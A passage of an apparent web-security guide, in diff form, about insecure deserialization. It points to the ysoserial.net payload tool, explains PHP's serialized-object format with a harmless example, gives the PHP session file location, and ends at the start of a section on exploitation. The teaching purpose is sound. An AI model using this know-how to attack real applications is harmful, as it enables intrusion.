+<h4 id="references">References:<a class="headerlink" href="#references" title="Permanent link"></a></h4>
+<ul>
+<li><a href="https://stackoverflow.com/questions/3052202/how-to-analyse-contents-of-binary-serialization-stream">Analyze Binary Serialization Stream</a></li>
+<li><a href="https://github.com/pwntester/ysoserial.net/">ysoserial.net</a></li>
+<li></li>
+</ul>
+<h3 id="php">PHP<a class="headerlink" href="#php" title="Permanent link"></a></h3>
+<p>PHP implements the serialize() and unserialize() functions to perform serialization and deserialization is used to store, transfer and transform whole objects. The PHP serialized object format, it&rsquo;s not far from a JSON array and it is human readable.</p>
+<div class="codehilite"><pre>PHP serialized object example:
+O:8:&quot;abcd1234&quot;:1:{s:7:&quot;AString&quot;;s:13:&quot;AnotherString&quot;;}
+</pre></div>
+
+<p>A good example of serialized object in PHP is the session file, usually stored within <code>/var/lib/php5/sess_[PHPSESSID]</code>.</p>
+<h4 id="php-how-the-exploitation-works">PHP: How the exploitation works<a class="headerlink" href="#php-how-the-exploitation-works" title="Permanent link"></a></h4>
+<p>The exploitation in PHP is strictly dependent on the specific application implementation.</p></article></body></html>
